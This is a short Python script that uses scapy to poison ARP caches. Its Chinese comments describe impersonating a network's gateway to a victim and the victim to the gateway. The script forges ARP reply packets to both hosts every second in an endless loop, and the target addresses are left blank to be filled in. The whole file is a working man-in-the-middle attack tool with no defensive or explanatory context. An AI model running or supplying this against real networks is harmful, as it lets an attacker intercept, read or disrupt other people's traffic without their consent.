import time
from scapy.all import *
from sys import argv


gatewayIP=""
victimIP=""

hackMAC=""
victimMAC=""
gatewayMAC=""

#print(getmacbyip())
''''''
# 二层根据mac地址传输数据帧
##受害者你好，我是你ip请求的网关，我的mac地址是[hack]，给我发消息吧
packet1=Ether(src=hackMAC,dst=victimMAC)/ARP(hwsrc=hackMAC,hwdst=victimMAC,psrc=gatewayIP,pdst=victimIP,op=2)
##网关你好，我是你ip请求的受害者，我的mac地址是[hack]，要发消息就发给我吧
packet2=Ether(src=hackMAC,dst=gatewayMAC)/ARP(hwsrc=hackMAC,hwdst=gatewayMAC,psrc=victimIP,pdst=gatewayIP,op=2)

#packet=Ether()/ARP(psrc=gatewayIP,pdst=victimIP)
while 1:
    sendp(packet1,iface="eth0",verbose=False)
    sendp(packet2,iface="eth0",verbose=False)
    time.sleep(1)
    print(packet1.show())
    print(packet2.show())